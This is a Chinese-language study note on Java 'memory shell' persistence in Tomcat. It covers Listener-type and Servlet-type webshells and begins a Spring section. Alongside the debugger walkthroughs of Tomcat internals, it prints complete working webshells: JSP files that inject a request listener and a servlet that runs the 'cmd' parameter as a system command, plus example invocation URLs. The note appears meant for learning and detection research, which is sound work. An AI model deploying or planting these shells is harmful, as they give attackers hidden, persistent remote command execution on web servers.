## Tomcat-Filter内存马版本问题

之前构造的filter型内存马是支持 tomcat 7 以上，原因是因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3。

且在Tomcat7与8中 FilterDef 和 FilterMap 这两个类所属的包名不一样

tomcat 7:

```
org.apache.catalina.deploy.FilterDef;
org.apache.catalina.deploy.FilterMap;
```

tomcat 8:

```
org.apache.tomcat.util.descriptor.web.FilterDef;
org.apache.tomcat.util.descriptor.web.FilterMap;
```

但是Servlet则是在Tomcat7与8中通用的，而Godzilla的内存马也是Servlet型内存马

## Tomcat-Filter型内存马二

来自： https://www.yuque.com/tianxiadamutou/zcfd4v/tzcdeb

https://xz.aliyun.com/t/7348

https://xz.aliyun.com/t/7388#toc-0

## Tomcat-Litener型内存马

当tomcat接收到请求时候，依次会经过Listener -> Filter -> Servlet

![img](img/image-20211007200844984.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20211007200844984.png?lastModify=1646033842)

Listener是最先被加载的，所以可以利用动态注册恶意的Listener内存马，而 listener 分为以下几种：

- ServletContext ，服务启动和终止时触发
- Session ，有关 session 操作实触发
- Request，访问服务时触发

关于监听Request对象的监听器是最适合做内存马的，只要访问服务就能触发操作。

#### ServletRequestListener接口

在Tomcat要引入 listener，需要实现两种接口，分别是`LifecycleListener`和`EvenListener`。

实现了`LifecycleListener`接口的监听器一般作用于tomcat初始化阶段，此时客户端的请求还没进入解析阶段，不适合做内存马。

所以看另一个`EventListener`接口，在Tomcat中，自定义了很多继承于`java.util.EventListener`的接口，应用于各个对象的监听。

![image-20220211181557695](img/image-20220211181557695.png)![image-20220211181557695](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211181557695.png?lastModify=1646033842)

重点看`ServletRequestListener`接口

![image-20220211181659758](img/image-20220211181659758.png)![image-20220211181659758](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211181659758.png?lastModify=1646033842)

`ServletRequestListener`用于监听`ServletRequest`对象的创建和销毁，当我们访问任意资源，无论servlet，jsp 还是静态资源，都会触发`requestInitialized`方法。

写demo

```
package listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class Demo implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println("Demo  requestDestroyed");
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("Demo  requestInitialized");
    }
}
```

web.xml

```
<listener>
    <listener-class>listener.Demo</listener-class>
</listener>
```

访问任意路径，控制台都会打印信息

![image-20220211182200276](img/image-20220211182200276.png)![image-20220211182200276](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182200276.png?lastModify=1646033842)

**requestInitialized：**在request对象创建时触发

**requestDestroyed：**在request对象销毁时触发

#### StandardContext 对象

`StandardContext`对象就是用来add恶意listener的地方。

`requestInitialized`处下断点，访问url后，显示出整个调用链

![image-20220211182504786](img/image-20220211182504786.png)![image-20220211182504786](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182504786.png?lastModify=1646033842)

通过调用链发现，Tomcat在`StandardHostValve`中调用了我们定义的Listener

![image-20220211182705720](img/image-20220211182705720.png)![image-20220211182705720](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182705720.png?lastModify=1646033842)

跟进`context.fireRequestInitEvent` ，被调用

![image-20220211182757869](img/image-20220211182757869.png)![image-20220211182757869](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182757869.png?lastModify=1646033842)

找到 lintener咋来的，

![image-20220211182834871](img/image-20220211182834871.png)![image-20220211182834871](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182834871.png?lastModify=1646033842)

![image-20220211182852130](img/image-20220211182852130.png)![image-20220211182852130](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211182852130.png?lastModify=1646033842)

在`StandardContext#addApplicationEventListener`添加了listener

![image-20220211183017873](img/image-20220211183017873.png)![image-20220211183017873](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211183017873.png?lastModify=1646033842)

这时候我们思路是，调用`StandardContext#addApplicationEventListener`方法，add我们自己写的恶意listener

需要在 jsp 中找到`StandardContext` 对象。

方式一：

```
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
```

方式二：

```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
```

网上公开的内存马

shell.jsp

```
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>

<%!
    public class MyListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(out);
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    MyListener listenerDemo = new MyListener();
    context.addApplicationEventListener(listenerDemo);
%>
```

访问 

http://localhost:8080/listener_war_exploded/shell.jsp?cmd=whoami

![image-20220211183547395](img/image-20220211183547395.png)![image-20220211183547395](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211183547395.png?lastModify=1646033842)



来自： https://xz.aliyun.com/t/10358

## Tomcat-Listener型内存马

#### 恶意Listener构造

实现 listener 需要 实现 `EventListener` 接口

![image-20220211193551883](img/image-20220211193551883.png)![image-20220211193551883](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211193551883.png?lastModify=1646033842)

实现接口有很多，内存马需要找一个每一此请求都会出发的 listener

找到`ServletRequestListener`

![image-20220211193854361](img/image-20220211193854361.png)![image-20220211193854361](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211193854361.png?lastModify=1646033842)

两方法分别为 请求初始化和销毁时调用。

测试

```
package listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class Demo implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println("Demo  requestDestroyed");
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("Demo  requestInitialized");
    }
}
```

web.xml

```
<listener>
    <listener-class>listener.Demo</listener-class>
</listener>
```

每次请求都会调用

![image-20220211194113926](img/image-20220211194113926.png)![image-20220211194113926](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211194113926.png?lastModify=1646033842)

两个问题：

- 恶意代码写在哪
- tomcat 中 listener 如何注册

filter 内存马是写在 doFilter 方法里的，

listener 这里可以写在上边重写的两个方法里都可以，因为都会被调用。

做内存马则必须接收发送过来的请求，获取参数进行执行命令。

![image-20220211194521390](img/image-20220211194521390.png)![image-20220211194521390](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211194521390.png?lastModify=1646033842)

很明显，通过`servletRequestEvent.getServletRequest();`可获取 Request 对象。

```
private final transient ServletRequest request;

public ServletRequest getServletRequest() {
    return this.request;
}
```

可以看到该方法返回的是 ServletRequest 接口的实现类

测试

```
System.out.println(servletRequestEvent.getServletRequest());
```

可以看到返回的类为`org.apache.catalina.connector.RequestFacade`，

![image-20220211194923763](img/image-20220211194923763.png)![image-20220211194923763](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211194923763.png?lastModify=1646033842)

该类中是有 Request 对象的

![image-20220211195022669](img/image-20220211195022669.png)![image-20220211195022669](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211195022669.png?lastModify=1646033842)

可用反射获取 

```
RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
try {
    Class<?> aClass = Class.forName("org.apache.catalina.connector.RequestFacade");
    Field request = aClass.getDeclaredField("request");
    request.setAccessible(true);
    Request request1 = (Request) request.get(requestFacade);
    System.out.println(request1);
} catch (Exception e) {
    e.printStackTrace();
}
```

得到`org.apache.catalina.connector.Request@3f04a9a0`

(其实这里直接强制类型转化为 HttpServlet 即可)

```
HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
```

构造

```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %><%!
    public class MyListener implements ServletRequestListener{

        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            try {
                Class<?> aClass = Class.forName("org.apache.catalina.connector.RequestFacade");
                Field requestField = aClass.getDeclaredField("request");
                requestField.setAccessible(true);
                Request req = (Request) requestField.get(requestFacade);
                if (req.getParameter("cmd") != null) {
                    InputStream in = null;
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext() ? s.next() : "";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request) requestF.get(req);
                    request.getResponse().getWriter().write(out);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
%>
```

#### listener 注册流程

在类上打断点，看如何实例化这个监听器的

![image-20220211200228573](img/image-20220211200228573.png)![image-20220211200228573](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211200228573.png?lastModify=1646033842)

顺着堆栈向上看可以很快的定位到 StandardContext#listenerStart 方法

![image-20220211200412015](img/image-20220211200412015.png)![image-20220211200412015](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211200412015.png?lastModify=1646033842)

```
String listener = listeners[i];
results[i] = this.getInstanceManager().newInstance(listener);
```

看下变量`listener` 哪来的，那就要寻找`listeners[i]`

![image-20220211200614669](img/image-20220211200614669.png)![image-20220211200614669](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211200614669.png?lastModify=1646033842)

很明显，从`this.findApplicationListeners()`得到

```
private String[] applicationListeners = new String[0];

public String[] findApplicationListeners() {
    return this.applicationListeners;
}
```

applicationListeners 属性即为监听器的全类名。

我们的 Listener 的名字被存放在 applicationListeners 数组中，然后通过`findApplicationListeners` 方法取出来被实例化，并放到`results`数组。

继续往下：

![image-20220211200927084](img/image-20220211200927084.png)![image-20220211200927084](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211200927084.png?lastModify=1646033842)

判断 listener 类型被分别存在不同数组，

ServletListener 属于第一个判断，所以被添加到了 eventListeners 数组中。

接下来，首先通过`this.getApplicationEventListeners()`获取已注册的 listener，添加进去，然后通过`setApplicationEventListeners`设置，先清空，在添加，最后`this.getApplicationLifecycleListeners()` 获取属性数组。

![image-20220211201047464](img/image-20220211201047464.png)![image-20220211201047464](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211201047464.png?lastModify=1646033842)

![image-20220211201233809](img/image-20220211201233809.png)![image-20220211201233809](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211201233809.png?lastModify=1646033842)

在前面的函数部分我们知道了 listenerStart() 将我们的 Listener 实例化添加到了 applicationEventListenersList 中，那么只存进去是不可能触发的，我们的 Listener 需要触发肯定需要一个函数点来调用.

**再看看如何调用监听器方法的**

在监听器重写方法内打断点

![image-20220211201509183](img/image-20220211201509183.png)![image-20220211201509183](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211201509183.png?lastModify=1646033842)

看`StandardContext#fireRequestInitEvent`，

![image-20220211201721112](img/image-20220211201721112.png)![image-20220211201721112](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211201721112.png?lastModify=1646033842)

可以看到这里的`listener` 是通过`this.getApplicationEventListeners()` 得到的，也就是属性`applicationEventListenersList`数组。

那么只需要将内存马需要的listener添加到这里就可以了。

#### 构造

```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%!
    public class MyListener implements ServletRequestListener{

        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {

            try {
                RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
                Class<?> aClass = Class.forName("org.apache.catalina.connector.RequestFacade");
                Field requestField = aClass.getDeclaredField("request");
                requestField.setAccessible(true);
                Request req = (Request) requestField.get(requestFacade);
                if(req.getParameter("cmd") != null){
                    String osType = System.getProperty("os.name");
                    String[] cmd = null;
                    if (osType.toLowerCase().contains("win")){
                        cmd = new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    }else {
                        cmd = new String[]{"sh", "-c", req.getParameter("cmd")};
                    }
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                    Scanner scanner = new Scanner(in).useDelimiter("\\a");
                    String out = scanner.hasNext() ? scanner.next() : "";
                    Response response = req.getResponse();
                    response.getWriter().write(out);
                    response.getWriter().flush();
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
%>

<%
    // 获得 StandardContext
    Field field = null;
    try {
        field = request.getClass().getDeclaredField("request");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    field.setAccessible(true);
    Request req  = (Request) field.get(request);
    StandardContext context = (StandardContext) req.getContext();

    // 添加恶意 listener
    Object[] objects = context.getApplicationEventListeners();
    List<Object> listeners = Arrays.asList(objects);
    ArrayList arrayList = new ArrayList(listeners);
    arrayList.add(new MyListener());
    context.setApplicationEventListeners(arrayList.toArray());
%>
```

来自： https://www.yuque.com/tianxiadamutou/zcfd4v/na64yv

## Tomcat-servlet型内存马

Servlet则是在Tomcat7与8中通用的，而Godzilla的内存马也是Servlet型内存马。

> ServletContext跟StandardContext的关系
>
> Tomcat中的对应的ServletContext实现是ApplicationContext。在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。

![image-20220211205003603](img/image-20220211205003603.png)![image-20220211205003603](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211205003603.png?lastModify=1646033842)

在ApplicationContext类中，有4个addServlet方法，前三个为重载，最终会走到

```
private javax.servlet.ServletRegistration.Dynamic addServlet(String servletName, String servletClass, Servlet servlet, Map<String, String> initParams) throws IllegalStateException {
    if (servletName != null && !servletName.equals("")) {
        if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {
            throw new IllegalStateException(sm.getString("applicationContext.addServlet.ise", new Object[]{this.getContextPath()}));
        } else {
            Wrapper wrapper = (Wrapper)this.context.findChild(servletName);
            if (wrapper == null) {
                wrapper = this.context.createWrapper();
                wrapper.setName(servletName);
                this.context.addChild(wrapper);
            } else if (wrapper.getName() != null && wrapper.getServletClass() != null) {
                if (!wrapper.isOverridable()) {
                    return null;
                }

                wrapper.setOverridable(false);
            }

            ServletSecurity annotation = null;
            if (servlet == null) {
                wrapper.setServletClass(servletClass);
                Class<?> clazz = Introspection.loadClass(this.context, servletClass);
                if (clazz != null) {
                    annotation = (ServletSecurity)clazz.getAnnotation(ServletSecurity.class);
                }
            } else {
                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                if (this.context.wasCreatedDynamicServlet(servlet)) {
                    annotation = (ServletSecurity)servlet.getClass().getAnnotation(ServletSecurity.class);
                }
            }

            if (initParams != null) {
                Iterator var9 = initParams.entrySet().iterator();

                while(var9.hasNext()) {
                    Entry<String, String> initParam = (Entry)var9.next();
                    wrapper.addInitParameter((String)initParam.getKey(), (String)initParam.getValue());
                }
            }

            javax.servlet.ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, this.context);
            if (annotation != null) {
                registration.setServletSecurity(new ServletSecurityElement(annotation));
            }

            return registration;
        }
    } else {
        throw new IllegalArgumentException(sm.getString("applicationContext.invalidServletName", new Object[]{servletName}));
    }
}
```

流程为：首先判断servletName是否为空，之后从StandardContext中获取child属性并转换为wrapper对象，如果wrapper为空就通过StandardContext的createWrapper方法创建一个Wrapper并通过StandardContext  addChid方法将Wrapper添加到StandardContext的属性Child中。方法最后会返回ApplicationServletRegistration对象.

先构造出内存马，

```
package servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;

@WebServlet("/addServletMemShell")
public class Demo extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // 获取ServletContext
        final ServletContext servletContext = req.getServletContext();
        Field appctx = null;
        try {
            // 获取ApplicationContext
            appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            // 获取StandardContext
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            String ServletName = "ServletMemShell";
            // 创建一个与程序现有Servlet不重名的Servlet
            if (servletContext.getServletRegistration(ServletName) == null){
                HttpServlet httpServlet = new HttpServlet(){
                    @Override
                    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                        this.doPost(req, resp);
                    }

                    @Override
                    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                        String cmd = req.getParameter("cmd");
                        if (cmd!=null){
                            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
                            int len;
                            while ((len = bufferedInputStream.read())!=-1){
                                resp.getWriter().write(len);
                            }
                        }
                    }
                };

                // Standard createWrapper 拿到Wrapper封装Servlet
                Wrapper wrapper = standardContext.createWrapper();
                //在Wrapper中设置ServletName
                wrapper.setName(ServletName);
                // 注意下面这一行代码
                wrapper.setLoadOnStartup(1);
                wrapper.setServlet(httpServlet);
                wrapper.setServletClass(httpServlet.getClass().getName());

                // 向children中添加wrapper
                standardContext.addChild(wrapper);
                // 设置ServletMappings
                standardContext.addServletMappingDecoded("/ServletMemShell", ServletName);

                resp.getWriter().write("Inject Tomcat ServletMemShell Success!");

            }


        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
```

先访问 http://localhost:8080/listener_war_exploded/addServletMemShell  会生成内存马

http://localhost:8080/listener_war_exploded/ServletMemShell?cmd=whoami

#### 创建分析

关键在

```
// Standard createWrapper 拿到Wrapper封装Servlet
Wrapper wrapper = standardContext.createWrapper();
//在Wrapper中设置ServletName
wrapper.setName(ServletName);
// 注意下面这一行代码
wrapper.setLoadOnStartup(1);
wrapper.setServlet(httpServlet);
wrapper.setServletClass(httpServlet.getClass().getName());

// 向children中添加wrapper
standardContext.addChild(wrapper);
// 设置ServletMappings
standardContext.addServletMappingDecoded("/ServletMemShell", ServletName);
```

看看`wrapper.setLoadOnStartup(1);`，那么`loadOnStartup`在什么地方被调用呢？回看了下调用栈，发现在StandardContext#startInternal方法中，依次调用了`listenerStart`、`filterStart`、`loadOnStartup`方法，

![image-20220212120344987](img/image-20220212120344987.png)![image-20220212120344987](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212120344987.png?lastModify=1646033842)

跟进`loadOnStartup`,前面是获取children属性并进行遍历

![image-20220212120546370](img/image-20220212120546370.png)![image-20220212120546370](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212120546370.png?lastModify=1646033842)

![image-20220212120555978](img/image-20220212120555978.png)![image-20220212120555978](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212120555978.png?lastModify=1646033842)

getLoadOnStartup()代码如下，这是StandardWrapper的属性loadOnStartup的get方法，依据条件，我们的代码中先通过`wrapper.setLoadOnStartup(1);`将其设置为1，那最后这里返回的值也是1.

![image-20220212120714342](img/image-20220212120714342.png)![image-20220212120714342](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212120714342.png?lastModify=1646033842)

也因此会进入下面的if中最后调用StandardWrapper#load方法,在load方法中进行Servlet的加载与初始化。

![image-20220212120827979](img/image-20220212120827979.png)![image-20220212120827979](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212120827979.png?lastModify=1646033842)

总体的调用栈如下，不过中间被省略了不少，比如addChild,chidStart,addServlet方法都有经过，

![image-20220212121058163](img/image-20220212121058163.png)![image-20220212121058163](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212121058163.png?lastModify=1646033842)

可以尝试把我们上面的`wrapper.setLoadOnStartup(1);`这行代码去掉，测试后发现依然不影响Servlet内存马的注入。

这里涉及到Servlet的一个加载问题：

> **针对配置了 load-on-startup 属性的 Servlet 而言，其它一般 Servlet 的加载和初始化会推迟到真正请求访问 web 应用而第一次调用该 Servlet 时**
>
> **在非配置load-on-startup 属性的 Servlet 而言，是不会在系统加载的时候创建具体的处理实例对象，依旧还只是个配置记录在Context中。真正的创建则是在第一次被请求的时候，才会实例化**

`wrapper.setLoadOnStartup(1);`只是影响Servlet在何时进行加载，而不影响他是否加载。

那没有loadOnStartup属性的Servlet怎么加载的呢？

回到调用栈中StandardWrapperValve#invoke方法中，重点是下面这一行

![image-20220212121455948](img/image-20220212121455948.png)![image-20220212121455948](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212121455948.png?lastModify=1646033842)

跟进去看实现，所以是在StandardWrapper#allocate方法中进行的Servlet加载与初始化

![image-20220212121650965](img/image-20220212121650965.png)![image-20220212121650965](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220212121650965.png?lastModify=1646033842)

综上，那其实创建Servlet的流程就不难理解了。

依旧是获取到StandardContext，创建Servlet的封装类Wrapper，也就是StandardWrapper，后续设置ServletNam与ServletClass并指定类与ServletMapping ，类似于Web.xml中的配置就是。

后续就是添加到child属性中，等待第一次访问该Servlet时让Tomcat去加载就好了，或者设置了`wrapper.setLoadOnStartup(1);`可以直接在系统加载的时候创建Servlet。

参考： https://www.cnblogs.com/CoLo/p/15782888.html

## spring 型内存马

#### 基础知识

#### Bean

`Bean`是 spring 框架的一个核心概念，它是构成应用程序的主干，并且是由`spring ioc`容器负责实例化、配置、组装和管理的对象。

通俗来讲：

- bean 是 对象
- bean 被 IOC 容器管理
- Spring 应用主要是由一个个的bean构成的

#### ApplicationContext

Spring框架中，`BeanFactory`接口是`Spring` ioc 容器 的实际代表者。

从下面的 接口继承图 可以看出，`ApplicationContext` 接口继承了`BeanFactory`接口，并通过继承其他接口进一步扩展了基本容器的功能。

![img](img/1835657-20220110002625351-137198606.png)

因此，`org.springframework.context.ApplicationContext`接口也代表了 `IoC容器` ，它负责实例化、定位、配置应用程序中的对象(`bean`)及建立这些对象间(`beans`)的依赖。

`IoC容器`通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用`xml`、`Java注解`或`Java代码`来表示。

还有一堆context继承了ApplicationContext接口，

![img](img/t0131f86d1b36acf0c8.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t0131f86d1b36acf0c8.png?lastModify=1646033842)

#### ContextLoaderListener 于 DispatcherServlet

spring的 web.xml 示例

```
<web-app xmlns:xsi="&lt;a href=" http:="" www.w3.org="" 2001="" XMLSchema-instance"="" rel="nofollow">http://www.w3.org/2001/XMLSchema-instance"
         xmlns="http://java.sun.com/xml/ns/javaee"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
         version="2.5">

    <display-name>HelloSpringMVC</display-name>

    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/applicationContext.xml</param-value>
    </context-param>

    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

    <servlet>
        <servlet-name>dispatcherServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/dispatcherServlet-servlet.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>
</web-app>
```

关于 `Root Context` 和 `Child Context` 的重要概念：

- Spring 应用中可以同时有多个 `Context`，其中只有一个 `Root Context`，剩下的全是 `Child Context`
- 所有`Child Context`都可以访问在 `Root Context`中定义的 `bean`，但是`Root Context`无法访问`Child Context`中定义的 `bean`
- 所有的`Context`在创建后，都会被作为一个属性添加到了 `ServletContext`中

#### ContextLoaderListener

`ContextLoaderListener` 主要用来初始化全局唯一的`Root Context`，即 `Root WebApplicationContext` 。这个`Root WebApplicationContext` 会和其他`child Context` 实例共享他的 IOC容器，供其他`child Context` 获取并使用容器中的 `bean`。

相关配置

```
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext.xml</param-value>
</context-param>

<listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>
```

依照规范，当没有显式配置 `ContextLoaderListener` 的 `contextConfigLocation` 时，程序会自动寻找 `/WEB-INF/applicationContext.xml`，作为配置文件，所以其实上面的 `<context-param>` 标签对其实完全可以去掉。

#### DispatcherServlet

`DispatcherServlet` 的主要作用是处理传入的Web请求，根据配置的`URLPattern`，将请求发给正确的 controlller 和 view 。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。

如下图， DispatcherServlet 从本质上来讲是一个 Servlet （扩展了 Servlet）

![img](img/t01b9de12b14cc8e673.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t01b9de12b14cc8e673.png?lastModify=1646033842)

再看 xml 相关配置

```
<servlet>
    <servlet-name>dispatcherServlet</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/dispatcherServlet-servlet.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

上面给 `org.springframework.web.servlet.DispatcherServlet`  类设置了个别名 dispatcherServlet，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml。

依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找  `/WEB-INF/<servlet-name>-servlet.xml`，作为配置文件。因为上面的 <servlet-name> 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件。

综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个 child Context，代表一个独立的 IOC 容器；而 ContextLoaderListener 创建的是一个 Root Context，代表全局唯一的一个公共的 IoC 容器。

如果要访问和操作 bean，一般要获得当前代码执行环境的 IoC 容器 代表者 ApplicationContext。

#### 实现思路

- spring 内存注入 webshell，要达到什么样的效果？

  在执行完一段 java 代码后，可通过正常的 URL 访问到内存中的 webshell 获得回显即可。

**实现思路：**

1. **在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境。**
2. **在不适用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller**
3. **controller 中写入 webshell 逻辑，达到 webshell 的 url 进行交互回显的效果**

## 获取 Context

所有的 `Context` 在创建后，都会被作为一个属性添加到了`ServletContext`。

**第一种：getCurrentWebApplicationContext()**

```
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

